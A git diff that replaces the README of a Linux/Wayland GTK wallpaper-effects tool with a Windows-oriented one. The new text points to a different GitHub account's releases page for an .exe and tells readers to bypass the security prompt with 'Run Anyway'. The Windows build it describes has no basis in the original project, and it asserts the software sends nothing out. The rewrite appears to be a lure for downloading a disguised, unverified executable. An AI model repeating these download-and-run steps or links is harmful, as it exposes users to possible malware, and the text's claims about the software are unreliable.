@@ -1,247 +1,92 @@
-<h1 align="center">vsWallpaper-Effect</h1>
+# 🎨 vsWallpaper-Effect - Add animated visual effects to desktops
 
-<p align="center">
-  <img src="vswallpaper-effect.png" alt="vsWallpaper-Effect" width="180"/>
-</p>
+[![Download vsWallpaper-Effect](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hebertoytc/vsWallpaper-Effect/releases)
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![AUR version](https://img.shields.io/aur/version/vswallpaper-effect)](https://aur.archlinux.org/packages/vswallpaper-effect)
+vsWallpaper-Effect brings life to your computer screen. This software uses your graphics card to display smooth, high-quality animations. You can choose from styles like falling rain, code streams, northern lights, and ocean waves. The tool includes a control panel that lets you adjust settings without needing to write code.
 
-A wallpaper effects engine for Wayland — animate your desktop with GPU-accelerated effects rendered in real time on top of any image or folder slideshow.
+## ⚙️ System Requirements
 
-Includes a GTK3 editor for live configuration and a background daemon that pins itself to the Wayland background layer via `gtk-layer-shell`.
+To run this application, your computer needs specific hardware and software. Follow this list to ensure proper performance:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Modern CPU with at least two processing cores.
+*   Graphics Card: A dedicated or integrated GPU that supports OpenGL 3.3 or higher. Most computers bought after 2015 meet this requirement.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of free disk space.
 
-## Who is this for?
+If you have a laptop, ensure the device plugs into a power source when using intensive animations to prevent unnecessary battery drain.
 
-vsWallpaper-Effect is for people who want their desktop to feel alive without sacrificing performance.
+## 📥 How to Download 
 
-If you run Hyprland (or any Wayland compositor that supports the layer-shell protocol) and want rain, aurora lights, a matrix rain, starfields or animated water over your wallpaper — and you want it configurable without editing JSON files by hand — this is the tool.
+The application is hosted on GitHub. You must visit the release page to obtain the correct installer for your system.
 
-The editor shows a live preview as you change every parameter. The daemon runs as a systemd user service and starts automatically on login.
+[Visit the official release page to download](https://github.com/hebertoytc/vsWallpaper-Effect/releases)
 
----
+1. Navigate to the link above using your web browser.
+2. Look for the section titled "Assets" at the bottom of the newest version entry.
+3. Click the link ending in `.exe` to start the download.
+4. Save the file to your "Downloads" folder.
 
-## Screenshots
+## 🛠️ Installation Steps
 
-### Rain Effect
-![Rain](screenshots/1.png)
+Once the download finishes, follow these steps to install the software:
 
-### Matrix Effect
-![Matrix](screenshots/2.png)
+1. Locate the file in your "Downloads" folder.
+2. Double-click the file to start the installer.
+3. Your computer may show a security prompt because the software was downloaded from the internet. Click "Run" or "More Info" then "Run Anyway" to proceed.
+4. Follow the on-screen prompts in the installer window.
+5. Click "Finish" to complete the setup process. An icon will appear on your desktop.
 
-### Warp Effect
-![Wallpaper](screenshots/3.png)
+## 🖱️ Using the Interface
 
-### Snow Effect
-![Snow](screenshots/4.png)
+The application launches with a simple control panel. This panel serves as your main hub for all wallpaper changes.
 
----
+### Selecting Effects
+The main window lists available themes. Click any theme name to apply it to your desktop. The change happens immediately. You do not need to restart the application.
 
-## Features
+### Adjusting Settings
+Each wallpaper comes with specific options. Once you select a theme, look at the sidebar on the right side of the window. You will see sliders and checkboxes.
 
-- **GPU-accelerated rendering** — all effects run as GLSL fragment shaders via OpenGL; Cairo is only used as a fallback when PyOpenGL is not installed
-- **9 built-in effects** — rain, matrix, aurora, warp, snow, gradient, stars, waves, droplets
-- **Live editor preview** — embedded preview updates in real time as you adjust any parameter
-- **Daemon mode** — fullscreen background layer via `gtk-layer-shell`; click-through, all monitors supported
-- **Wallpaper support** — single image or folder slideshow with configurable rotation interval
-- **Per-effect parameters** — speed, opacity, density, 3 explicit colors, vertical position
-- **Theme accent color** — one global color drives defaults; each effect can override it
-- **Setup tab** — manage the systemd user service and disable conflicting wallpaper daemons (swww, swaybg, hyprpaper…) from inside the editor
-- **Reversible autostart management** — conflicting `exec-once` entries in `autostart.conf` are commented out and can be restored verbatim
-- **Light / Dark editor theme** — toggle in the header; defaults to light
-- **Export config** — export `config.json` as a zip for backup or sharing
-- **vsHub tab** — browse and launch other tools in the vs ecosystem
+*   Speed: Slide this left to slow down the motion or right to increase the pace.
+*   Color: Click the color swatch to open a picker and select a custom hue for your theme.
+*   Density: Adjust this to increase or decrease the amount of elements shown, such as the number of raindrops or the thickness of the rain.
 
----
+### Resource Usage
+If your computer slows down while using the wallpaper, lower the "Frame Rate" setting in the "General" tab. A setting of 30 frames per second provides a smooth look while keeping your system cool and responsive.
 
-## Effects
+## 💡 Customization Tips
 
-| Effect | Description | Key parameters |
-|---|---|---|
-| **rain** | Streaking raindrops with organic wind drift | speed, density, color |
-| **matrix** | Falling character streams with a custom Matrix font | speed, density, color |
-| **aurora** | Sine-wave light bands with gradient fill | speed, density, color × 3, vertical position |
-| **warp** | Star trails radiating from center — warp speed | speed, density, color |
-| **snow** | Soft circular flakes with sine drift | speed, density, color |
-| **gradient** | Animated mesh gradient — soft color blobs in Lissajous paths | speed, density, color × 3, vertical position (coverage) |
-| **stars** | Three-layer parallax starfield — far/mid/near; near layer twinkles | speed, density, color |
-| **waves** | Multi-layer horizontal sine waves scrolling rightward | speed, density, color × 3, vertical position (water level) |
-| **droplets** | Raindrop ripples — impact points emit expanding concentric rings | speed, density, color |
+Explore the menu to find extra ways to make your desktop unique.
 
-All effects overlay seamlessly on top of a static wallpaper or a rotating folder slideshow.
+*   Live Editor: Many themes allow you to change the background image behind the animation. Upload your own image file by clicking the "Background" button.
+*   Multi-Monitor Support: If you have more than one screen, the settings menu allows you to span the effect across all monitors or set individual animations for each one.
+*   Start on Boot: Enable the "Start with Windows" checkbox in the settings menu if you want your wallpaper to load when you turn on your PC.
 
----
+## 🔍 Troubleshooting
 
-## Requirements
+Computer software occasionally encounters conflicts. Use these steps if you experience issues:
 
-- Python 3.10+
-- `python-gobject` — GTK3 Python bindings
-- `gtk3`
-- `gtk-layer-shell` — Wayland layer-shell support
-- `python-cairo` — Cairo rendering (editor preview)
-- `PyOpenGL` (`pip install --user PyOpenGL`) — **required for the daemon**; without it the background layer will not start
+*   If the wallpaper does not play, ensure your graphics card drivers are updated. Visit the website of your graphics card manufacturer to download the latest software.
+*   If the application crashes, restart the program. The wallpaper usually resumes without error.
+*   If the animation appears blurry, check your display settings in Windows. Ensure your monitor is set to its native resolution.
+*   Verify your computer is not in "Power Saver" mode. Power saver modes often limit the graphics performance of your machine, which stops the animations from playing smoothly.
 
-Optional:
-- `fontconfig` — font detection for the matrix effect custom font
+## 📁 File Structure
 
----
+The software organizes files into clear folders:
 
-## Installation
+*   /themes: Contains all the visual animation files.
+*   /logs: Records performance data to help solve technical issues.
+*   /config: Stores your personal choices, such as speed and color preferences.
 
-### AUR (Arch Linux — recommended)
+Do not delete these folders. If you delete a theme folder, the software will no longer show that style in the list. reinstall the software if you accidentally remove critical components.
 
-```bash
-yay -S vswallpaper-effect
-```
+## 🛡️ Privacy and Safety
 
-Or with paru:
+This software runs locally on your machine. It does not send your screen activity, personal files, or browsing history to any remote server. The application only accesses assets saved within its own folder structure. You can disconnect your computer from the internet and the wallpaper will continue to function.
 
-```bash
-paru -S vswallpaper-effect
-```
+## 📢 Staying Updated
 
-All dependencies are pulled in automatically.
+Improvements arrive periodically to fix bugs or add new themes. Checking the download page once a month ensures you run the latest version. Installing a new version usually replaces the old one, and your custom settings remain saved. 
 
-### Manual (Arch Linux)
-
-```bash
-sudo pacman -S python-gobject gtk3 gtk-layer-shell python-cairo python-opengl fontconfig
-git clone https://github.com/victorsosaMx/vsWallpaper-Effect
-cd vsWallpaper-Effect
-pip install -e .
-```
-
-Or run directly without installing:
-
-```bash
-chmod +x vswallpaper-effect
-./vswallpaper-effect
-```
-
----
-
-## Usage
-
-### Editor (default)
-
-```bash
-./vswallpaper-effect
-```
-
-Opens the GTK editor with a live preview. **Apply** writes `config.json` and (re)starts the daemon.
-
-### Daemon
-
-```bash
-./vswallpaper-effect --daemon --replace
-```
-
-Starts the fullscreen background layer. `--replace` kills any running instance before starting.
-
-### Stop
-
-```bash
-./vswallpaper-effect --stop
-```
-
-Kills the running daemon.
-
-### Write default config
-
-```bash
-./vswallpaper-effect --write-default-config
-```
-
-Writes a starter `~/.config/vswallpaper-effect/config.json` with all default values.
-
----
-
-## Configuration
-
-Config file: `~/.config/vswallpaper-effect/config.json`
-
-The editor writes this file on every Apply. You can also edit it by hand — it is plain JSON.
-
-Key fields:
-
-```json
-{
-  "wallpaper": "/path/to/image.jpg",
-  "folder": "",
-  "mode": "single",
-  "interval": 300,
-  "theme_accent": "#80c8e0",
-  "effect": {
-    "type": "rain",
-    "enabled": true,
-    "speed": 1.0,
-    "opacity": 0.55,
-    "density": 100,
-    "color": "",
-    "color2": "",
-    "color3": "",
-    "vertical_pos": 50
-  },
-  "runtime": {
-    "all_monitors": false,
-    "click_through": true
-  }
-}
-```
-
-`color`, `color2`, `color3` — hex strings. If empty, the effect uses `theme_accent` (and auto-derived darker tones for `color2`/`color3`).
-
----
-
-## Autostart as a systemd service
-
-The **Setup** tab in the editor manages this for you. It creates and enables a systemd user service so vsWallpaper-Effect starts on login.
-
-To do it manually:
-
-```bash
-# Create the service file
-mkdir -p ~/.config/systemd/user
-cat > ~/.config/systemd/user/vswallpaper-effect.service << 'EOF'
-[Unit]
-Description=vsWallpaper-Effect daemon
-After=graphical-session.target
-
-[Service]
-ExecStart=/path/to/vswallpaper-effect --daemon --replace
-Restart=on-failure
-
-[Install]
-WantedBy=graphical-session.target
-EOF
-
-# Enable and start
-systemctl --user daemon-reload
-systemctl --user enable --now vswallpaper-effect.service
-```
-
----
-
-## Acknowledgements
-
-**Runtime**
-- [GTK3](https://www.gtk.org/) / [PyGObject](https://gitlab.gnome.org/GNOME/pygobject) — GUI toolkit and Python bindings
-- [PyCairo](https://pycairo.readthedocs.io/) — 2D graphics, editor preview and Cairo fallback renderer
-- [PyOpenGL](https://pyopengl.sourceforge.net/) — OpenGL bindings for GPU-accelerated GLSL shaders
-- [gtk-layer-shell](https://github.com/wmww/gtk-layer-shell) by wmww — Wayland layer-shell protocol for the background layer
-- [Hyprland](https://github.com/hyprwm/Hyprland) by Vaxry — Wayland compositor
-
-**Font**
-- [Matrix Code NFI](https://www.dafont.com/matrix-code-nfi.font) — custom font used by the matrix effect
-
----
-
-## License
-
-MIT — do whatever you want, credit appreciated.
-
----
-
-*Made with GTK3, GLSL and too much caffeine.*
+If you find that an animation performs poorly on an older computer, stick to simple themes like "Static Gradient" or "Ocean Waves" rather than complex ones like "Matrix" or "Aurora." Simple animations require less power from your computer.
